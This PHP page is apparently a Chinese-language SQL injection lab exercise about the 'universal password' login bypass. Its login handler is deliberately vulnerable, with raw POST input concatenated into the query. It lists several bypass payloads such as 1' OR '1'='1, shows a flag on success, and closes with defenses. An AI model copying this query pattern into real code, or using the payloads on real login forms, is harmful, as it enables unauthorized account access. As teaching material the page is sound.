<?php
// 万能密码注入场景
// 使用真实MySQL数据库

// 数据库连接信息
$servername = "127.0.0.1";
$username = "root";
$password = "123456";
$dbname = "zhao";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 数据库已在init_db.php中初始化

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$login_success = false;
$error = '';
$user_info = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 执行查询（存在SQL注入漏洞）
    $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    
    try {
        $result = $conn->query($sql);
        if ($result && $result->num_rows > 0) {
            $user_info = $result->fetch_assoc();
            $login_success = true;
        } else {
            $error = "用户名或密码错误";
        }
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}

// 关闭连接
$conn->close();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>万能密码注入 - SQL注入漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #e8f4fd;
            border-left: 5px solid #667eea;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .login-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .form-group {
            margin: 15px 0;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            width: 100%;
            margin-top: 10px;
        }
        .sql-code {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            position: relative;
        }
        .sql-code::before {
            content: "执行的SQL:";
            display: block;
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .success-message {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list h4 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .payload-list code:hover {
            text-decoration: underline;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 万能密码注入漏洞</h4>
                <p>本页面存在万能密码注入漏洞，攻击者可以通过构造特殊的用户名和密码来绕过登录验证。</p>
            </div>
            
            <h2>1. 🔑 万能密码注入</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                万能密码注入是一种常见的SQL注入攻击方式，主要针对登录表单。<br>
                当应用程序直接将用户输入拼接到SQL语句中时，攻击者可以构造特殊的输入来绕过密码验证。<br>
                <br>
                <strong>危害：</strong>绕过登录验证、获取管理员权限、控制整个系统
            </div>
        </div>

        <div class="card">
            <h3>🔍 用户登录（存在漏洞）</h3>
            <div class="login-box">
                <form method="POST">
                    <div class="form-group">
                        <label for="username">用户名：</label>
                        <input type="text" id="username" name="username" placeholder="请输入用户名" value="<?php echo htmlspecialchars($username); ?>">
                    </div>
                    <div class="form-group">
                        <label for="password">密码：</label>
                        <input type="password" id="password" name="password" placeholder="请输入密码" value="<?php echo htmlspecialchars($password); ?>">
                    </div>
                    <button type="submit" class="btn">登录</button>
                </form>
                
                <?php if ($error): ?>
                <div style="color: #e74c3c; margin: 15px 0;">
                    <strong>错误：</strong><?php echo htmlspecialchars($error); ?>
                </div>
                <?php endif; ?>
                
                <?php if ($login_success): ?>
                <div class="success-message">
                    <h4>登录成功！</h4>
                    <p>欢迎，<?php echo htmlspecialchars($user_info['username']); ?>！</p>
                    <p>用户ID：<?php echo htmlspecialchars($user_info['id']); ?></p>
                    <p>邮箱：<?php echo htmlspecialchars($user_info['email']); ?></p>
                </div>
                <div class="flag-box show">
                    🚩 FLAG{Magic_Quotes_Success}<br>
                    <span style="font-size: 0.9rem;">你成功完成了万能密码注入！</span>
                </div>
                <?php endif; ?>
            </div>
        </div>

        <div class="card">
            <h3>🎯 万能密码Payload</h3>
            <div class="payload-list">
                <h4>1. 基本万能密码</h4>
                <code class="payload" data-username="admin" data-password="1' OR '1'='1">用户名: admin, 密码: 1' OR '1'='1</code>
                <code class="payload" data-username="admin" data-password="1' OR '1'='1' --">用户名: admin, 密码: 1' OR '1'='1' --</code>
                
                <h4>2. 用户名注入</h4>
                <code class="payload" data-username="admin' --" data-password="任意密码">用户名: admin' --, 密码: 任意密码</code>
                <code class="payload" data-username="admin' #" data-password="任意密码">用户名: admin' #, 密码: 任意密码</code>
                
                <h4>3. 其他变种</h4>
                <code class="payload" data-username="admin" data-password="1' OR 1=1#">用户名: admin, 密码: 1' OR 1=1#</code>
                <code class="payload" data-username="admin" data-password="1') OR '1'='1">用户名: admin, 密码: 1') OR '1'='1</code>
            </div>
        </div>

        <div class="card">
            <h3>📚 万能密码注入原理</h3>
            <div class="info-section">
                <strong>万能密码注入的原理：</strong><br>
                通过在输入中插入单引号和逻辑运算符，改变SQL语句的逻辑结构，使WHERE条件永远为真。
            </div>
            <div class="sql-code">
-- 原始SQL语句
SELECT * FROM users WHERE username='admin' AND password='123456';

-- 注入后的SQL语句
SELECT * FROM users WHERE username='admin' AND password='1' OR '1'='1';

-- 解释：
-- '1'='1' 永远为真，所以整个条件永远为真
-- 这样就可以绕过密码验证，直接登录
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>参数化查询：</strong>使用预处理语句和绑定参数<br>
                2. <strong>输入验证：</strong>对用户输入进行类型检查和过滤<br>
                3. <strong>密码哈希：</strong>存储密码的哈希值而不是明文<br>
                4. <strong>WAF防护：</strong>部署Web应用防火墙<br>
                5. <strong>错误处理：</strong>不向用户显示详细的错误信息
            </div>
            
            <div class="sql-code">
// 安全的参数化查询（PHP PDO示例）
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
            </div>
            
            <a href="index.php" class="back-link">← 返回SQL注入模块首页</a>
        </div>
    </div>

    <script>
        function setLogin(username, password) {
            document.getElementById('username').value = username;
            document.getElementById('password').value = password;
        }
        
        // 为所有payload元素添加点击事件
        document.addEventListener('DOMContentLoaded', function() {
            var payloads = document.querySelectorAll('.payload');
            payloads.forEach(function(payload) {
                payload.addEventListener('click', function() {
                    var username = this.getAttribute('data-username');
                    var password = this.getAttribute('data-password');
                    setLogin(username, password);
                });
            });
        });
    </script>
</body>
</html>
